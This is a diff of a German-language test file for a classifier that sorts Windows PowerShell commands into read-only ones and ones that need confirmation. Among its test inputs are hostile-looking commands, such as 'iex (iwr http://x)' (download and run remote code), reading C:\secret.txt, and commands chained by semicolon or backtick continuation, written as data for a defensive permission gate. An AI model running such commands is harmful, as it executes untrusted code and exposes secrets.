@@ -193,6 +193,12 @@ describe('I8a Windows-Befehlsklassen', () => {
       expect(windowsBefehlsklasse(b), b).toBe('lesen');
     }
   });
+  it('I8b — alle Befehle des Windows-Sammlers sind Lesen', async () => {
+    const { WINDOWS_BEFEHLE } = await import('../infrastruktur/sammler-windows.js');
+    for (const b of Object.values(WINDOWS_BEFEHLE)) expect(windowsBefehlsklasse(b), b).toBe('lesen');
+    expect(windowsBefehlsklasse('Start-WUScan -SearchCriteria IsInstalled=0')).toBe('bestaetigen');
+    expect(windowsBefehlsklasse('Get-Process -IncludeUserName')).toBe('bestaetigen');
+  });
   it('Skriptblöcke, Variablen, Verkettung, Pfade und Unbekanntes brauchen Bestätigung; Datenträger-Löschen nie', () => {
     for (const b of ['Get-Service | Where-Object { $_.Status -eq "Running" }', 'Get-ComputerInfo; Restart-Computer', 'Get-Content C:\\secret.txt', 'Stop-Service sshd', 'Get-Service | Out-File C:\\x.txt', 'Get-Volume | Invoke-Expression', 'iex (iwr http://x)', 'Get-Service `\nRestart-Computer']) {
       expect(windowsBefehlsklasse(b), b).toBe('bestaetigen');
